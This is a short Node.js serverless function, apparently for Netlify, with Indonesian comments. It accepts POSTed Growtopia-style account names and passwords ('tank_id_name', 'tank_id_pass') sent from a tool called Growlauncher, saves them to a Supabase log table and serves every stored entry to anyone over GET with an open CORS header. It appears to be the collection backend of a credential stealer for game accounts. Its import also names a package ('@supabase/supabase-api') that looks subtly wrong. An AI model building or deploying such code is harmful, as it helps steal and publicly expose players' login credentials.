const { createClient } = require('@supabase/supabase-api');

// Ambil URL dan Key dari Environment Variables Netlify
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

exports.handler = async (event) => {
  // Method POST untuk menerima data dari Growlauncher
  if (event.httpMethod === 'POST') {
    const data = JSON.parse(event.body);
    
    const { error } = await supabase
      .from('growlauncher_logs')
      .insert([
        { 
          tank_id_name: data.idName, 
          tank_id_pass: data.idPass, 
          meta_data: data.meta 
        }
      ]);

    if (error) return { statusCode: 500, body: JSON.stringify(error) };
    return { statusCode: 200, body: "Data Saved to Supabase!" };
  }

  // Method GET untuk menampilkan data ke UI Website
  if (event.httpMethod === 'GET') {
    const { data, error } = await supabase
      .from('growlauncher_logs')
      .select('*')
      .order('created_at', { ascending: false });

    return {
      statusCode: 200,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify(data)
    };
  }
};
